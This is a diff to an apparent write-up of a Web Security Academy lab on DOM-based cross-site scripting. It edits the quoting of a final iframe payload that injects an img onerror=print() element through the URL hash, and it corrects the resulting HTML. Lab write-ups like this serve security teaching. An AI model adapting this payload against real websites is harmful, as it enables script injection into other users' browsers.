@@ -39,14 +39,14 @@ Trigger the `print()` function in the victim's browser.
 
 ✅ Final Payload
 
-<iframe src="https://LAB-ID.web-security-academy.net//#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
+"<iframe src="https://LAB-ID.web-security-academy.net//#" onload="this.src+='<img src=x onerror=print()>'"></iframe>"
 
 🔎 Which results in:
-
+"
 <section class="blog-list">
-    <h2>img src="x" onerror="print()"></h2>
+    <h2><img src="x" onerror="print()"></h2>
 </section>
-
+"
 💥 print() executes as soon as the hashchange event fires.
 🧠 Notes
 
